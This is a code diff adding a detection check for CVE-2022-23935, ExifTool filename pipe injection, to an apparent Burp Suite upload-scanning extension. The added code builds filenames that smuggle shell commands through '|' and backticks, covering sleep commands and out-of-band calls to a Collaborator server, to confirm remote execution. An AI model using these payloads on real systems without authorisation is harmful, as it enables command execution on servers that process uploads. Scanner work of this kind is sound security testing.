@@ -1186,6 +1186,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                 self._imagetragick_cve_2016_3714_sleep(injector)
                 self._bad_manners_cve_2018_16323(injector)
                 colab_tests.extend(self._exiftool_cve_2021_22204(injector, burp_colab))
+                colab_tests.extend(self._exiftool_cve_2022_23935(injector, burp_colab))
                 self._imagemagick_cve_2022_44268(injector)
                 colab_tests.extend(self._imagetragick_cve_2023_34152(injector, burp_colab))
                 self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
@@ -1720,6 +1721,57 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                                                   "", issue, replace=_make_djvu))
 
         return colabs
+
+    def _exiftool_cve_2022_23935(self, injector, burp_colab):
+        # CVE-2022-23935: ExifTool <= 12.37 uses two-arg Perl open() with the filename, so a
+        # filename starting with | is treated as a shell pipe command. Backtick variants cover
+        # the related case where the server invokes exiftool via shell (system("exiftool " + name)).
+        content = injector.get_uploaded_content()
+        if content is None:
+            return []
+
+        types = [('', BurpExtender.MARKER_ORIG_EXT, '')]
+        name = "ExifTool CVE-2022-23935 filename RCE"
+        severity = "High"
+        confidence = "Certain"
+        base_detail = "A file was uploaded with a crafted filename exploiting CVE-2022-23935 " \
+                      "(ExifTool <= 12.37, Perl two-argument open() pipe injection via filename). " \
+                      "See https://nvd.nist.gov/vuln/detail/CVE-2022-23935 for details. "
+        detail_sleep = "A delay was detected twice when uploading a file whose filename triggers " \
+                       "CVE-2022-23935. Therefore arbitrary command execution via ExifTool seems possible. " \
+                       "The filename used was {}."
+        detail_colab = "A Burp collaborator interaction was detected when uploading a file whose filename triggers " \
+                       "CVE-2022-23935. Therefore arbitrary command execution via ExifTool seems possible. " \
+                       "The filename used was {}. Interactions:<br><br>"
+
+        for cmd_name, cmd, factor, args in self._get_sleep_commands(injector):
+            sleep_arg = str(injector.opts.sleep_time * factor) + args
+            basenames = [
+                "|{} {}".format(cmd, sleep_arg),
+                "|{} {} #.jpg".format(cmd, sleep_arg),
+                "`{} {}`.jpg".format(cmd, sleep_arg),
+            ]
+            for basename in basenames:
+                details = base_detail + detail_sleep.format(basename)
+                issue = self._create_issue_template(injector.get_brr(), name, details, confidence, severity)
+                self._send_sleep_based(injector, basename, content, types, injector.opts.sleep_time, issue)
+
+        if not burp_colab:
+            return []
+        colab_tests = []
+
+        for cmd_name, cmd, server, replace in self._get_rce_interaction_commands(injector, burp_colab):
+            basenames = [
+                "|{} {}".format(cmd, server),
+                "|{} {} #.jpg".format(cmd, server),
+                "`{} {}`.jpg".format(cmd, server),
+            ]
+            for basename in basenames:
+                details = base_detail + detail_colab.format(basename)
+                issue = self._create_issue_template(injector.get_brr(), name, details, confidence, severity)
+                colab_tests.extend(self._send_collaborator(injector, burp_colab, types, basename, content, issue, replace=replace))
+
+        return colab_tests
 
     def _imagemagick_cve_2022_44268(self, injector):
         def _read_ztxt_chunk_from_png(imgdata):
